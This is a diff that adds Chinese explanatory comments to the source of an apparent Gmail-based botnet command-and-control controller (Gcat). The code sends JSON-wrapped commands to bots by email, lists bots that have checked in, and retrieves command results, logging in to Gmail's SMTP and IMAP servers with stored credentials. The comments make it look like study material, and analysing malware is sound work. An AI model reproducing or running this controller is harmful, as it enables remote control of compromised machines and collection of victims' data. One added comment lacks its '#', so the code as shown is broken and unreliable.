@@ -25,10 +25,10 @@ server = "smtp.gmail.com"
 server_port = 587
 #######################################
 
-def genJobID(slen=7):
+def genJobID(slen=7): #生成jobid
     return ''.join(random.sample(string.ascii_letters + string.digits, slen))
 
-class msgparser:
+class msgparser: #信息解析，所有涉及邮件接受的模块都将调用这一类
 
     def __init__(self, msg_data):
         self.attachment = None
@@ -57,18 +57,18 @@ class Gcat:
         self.c = imaplib.IMAP4_SSL(server)
         self.c.login(gmail_user, gmail_pwd)
 
-    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
+    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):#发送邮件模块
 
         if (botid is None) or (jobid is None):
             sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
         
-        sub_header = 'gcat:{}:{}'.format(botid, jobid)
+        sub_header = 'gcat:{}:{}'.format(botid, jobid) #筛选信息为gcat+botid+jobid,封装在头
 
         msg = MIMEMultipart()
         msg['From'] = sub_header
         msg['To'] = gmail_user
         msg['Subject'] = sub_header
-        msgtext = json.dumps({'cmd': cmd, 'arg': arg})
+        msgtext = json.dumps({'cmd': cmd, 'arg': arg}) #正文封装控制命令等主体信息
         msg.attach(MIMEText(str(msgtext)))
         
         for attach in attachment:
@@ -79,20 +79,20 @@ class Gcat:
                 part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                 msg.attach(part)
 
-        mailServer = SMTP()
-        mailServer.connect(server, server_port)
-        mailServer.starttls()
-        mailServer.login(gmail_user,gmail_pwd)
-        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
-        mailServer.quit()
+        mailServer = SMTP() #使用SMTP协议库
+        mailServer.connect(server, server_port) #连接到服务器
+        mailServer.starttls() 信息加密
+        mailServer.login(gmail_user,gmail_pwd) #登陆
+        mailServer.sendmail(gmail_user, gmail_user, msg.as_string()) #发送邮件
+        mailServer.quit() #断开与服务器的连接
 
         print "[*] Command sent successfully with jobid: {}".format(jobid)
 
 
-    def checkBots(self):
+    def checkBots(self):#检查报到僵尸模块
         bots = []
-        self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')")
+        self.c.select(readonly=1) #从默认的INBOX文件夹取文件
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')") #先筛选checkin
 
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
@@ -103,7 +103,7 @@ class Gcat:
                 if botid not in bots:
                     bots.append(botid)
                     
-                    print botid, msg.dict['sys']
+                    print botid, msg.dict['sys'] #得到botid，打印到屏幕上
             
             except ValueError:
                 pass
@@ -113,8 +113,8 @@ class Gcat:
         if botid is None:
             sys.exit("[-] You must specify a client id (-id)")
 
-        self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid))
+        self.c.select(readonly=1) #从默认的INBOX文件夹取文件
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid)) #筛选checkin+botid
 
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
@@ -126,19 +126,19 @@ class Gcat:
             print "ADMIN: " + str(msg.dict['admin']) 
             print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])
 
-    def getJobResults(self, botid, jobid):
+    def getJobResults(self, botid, jobid): #得到命令执行结果模块
 
         if (botid is None) or (jobid is None):
             sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
 
         self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid))
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid)) #先筛选邮件，筛选imp+botid+jobid
 
-        for idn in idlist[0].split():
+        for idn in idlist[0].split(): 
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
-            msg = msgparser(msg_data)
+            msg = msgparser(msg_data) #再调用msgparser类进行解析得到正文中的结果信息
 
-            print "DATE: '{}'".format(msg.date)
+            print "DATE: '{}'".format(msg.date) #打印结果信息
             print "JOBID: " + jobid
             print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
             print "CMD: '{}'".format(msg.dict['msg']['cmd'])
